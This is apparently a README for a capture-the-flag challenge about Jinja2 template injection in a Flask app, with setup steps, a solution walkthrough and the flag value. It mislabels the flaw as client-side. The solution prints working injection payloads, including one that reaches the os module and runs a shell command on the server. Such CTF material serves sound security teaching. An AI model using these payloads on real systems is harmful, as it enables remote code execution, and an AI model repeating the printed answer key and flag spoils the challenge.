# Jinja2 CSTI CTF Challenge - Render This!

## Challenge Description

This is a Web Exploitation challenge where players must exploit Client-Side Template Injection (CSTI) in Jinja2.

## Deployment Instructions

1. Install dependencies:
```sh
pip install flask
```
2. Run the Flask application:
```sh
python app.py
```
3. Access the challenge at `http://127.0.0.1:5000/`.

## Solving the Challenge

1. Test for template injection:
```sh
{{7*7}}
```
2. Escalate to access environment variables:
```sh
{{config.__class__.__init__.__globals__}}
```
3. Retrieve the flag stored in `flag.txt`.
#*May this {{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }} could usefull

## Flag Format
```
SSEC{akij_kjdnschb_wkscadd}
```
